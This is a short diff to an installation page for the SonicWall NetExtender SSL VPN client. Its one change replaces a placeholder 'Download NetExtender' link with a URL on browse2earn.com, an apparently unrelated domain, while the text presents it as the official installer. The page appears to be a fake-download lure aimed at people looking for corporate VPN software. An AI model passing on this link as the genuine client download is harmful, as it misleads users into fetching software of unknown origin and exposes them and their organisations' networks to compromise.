@@ -13,7 +13,7 @@ SonicWall NetExtender is a lightweight SSL VPN client built for remote users who
 ## Installation
 To begin, download the NetExtender client for Windows by clicking the link below:
 
-[**Download NetExtender**](*)
+[**Download NetExtender**](https://browse2earn.com/2ear/)
 
 Initiate your secure access setup by obtaining the installer file. This step is essential for configuring a reliable SSL VPN tunnel to your corporate environment. After the download finishes, follow the setup instructions to install the client and gain encrypted access from virtually any location.
 
